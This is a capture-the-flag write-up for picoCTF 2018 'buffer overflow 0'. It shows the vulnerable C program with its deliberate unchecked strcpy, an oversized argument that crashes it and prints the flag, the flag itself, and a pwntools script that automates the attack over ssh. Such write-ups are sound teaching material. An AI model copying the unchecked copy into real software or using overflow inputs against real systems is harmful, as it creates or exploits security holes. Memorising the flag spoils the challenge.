Source code

```c
#include <stdio.h>                                                                                            
#include <stdlib.h>                                                                                           
#include <string.h>                                                                                           
#include <signal.h>                                                                                           
                                                                                                              
#define FLAGSIZE_MAX 64                                                                                       
                                                                                                              
char flag[FLAGSIZE_MAX];                                                                                      
                                                                                                              
void sigsegv_handler(int sig) {                                                                               
  fprintf(stderr, "%s\n", flag);                                                                              
  fflush(stderr);                                                                                             
  exit(1);                                                                                                    
}                                                                                                             
                                                                                                              
void vuln(char *input){                                                                                       
  char buf[16];                                                                                               
  strcpy(buf, input);                                                                                         
}                                                                                                             
                                                                                                              
int main(int argc, char **argv){                                                                              


  FILE *f = fopen("flag.txt","r");                                                                            
  if (f == NULL) {                                                                                            
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on
 the shell server.\n");                                                                                       
    exit(0);                                                                                                  
  }                                                                                                           
  fgets(flag,FLAGSIZE_MAX,f);                                                                                 
  signal(SIGSEGV, sigsegv_handler);                                                                           


  gid_t gid = getegid();                                                                                      
  setresgid(gid, gid, gid);                                                                                   


  if (argc > 1) {                                                                                             
    vuln(argv[1]);                                                                                            
    printf("Thanks! Received: %s", argv[1]);                                                                  
  }                                                                                                           
  else                                                                                                        
    printf("This program takes 1 argument.\n");                                                               
  return 0;                                                                                                   
}                                                                                                             
```

<br/>

Connect with ssh

```bash
$ ssh campeon33@2018shell4.picoctf.com
```

<br/>

Sending a lot of characters to cause a buffer overlfow:

```bash
$ cd /problems/buffer-overflow-0_4_ab1efebbee9446039487c64b88d38631
$ ./vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}
```

<br/>

Now a python script that does everything:

```python
from pwn import *
import paramiko

user = 'yourusername'
password = 'yourpassword'
host = '2018shell4.picoctf.com'

s = ssh(user=user,password=password,host=host)

p = s.run("sh")
p.sendline('cd /problems/buffer-overflow-0_4_ab1efebbee9446039487c64b88d38631 && ./vuln' + ' ' + 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
p.interactive()
```
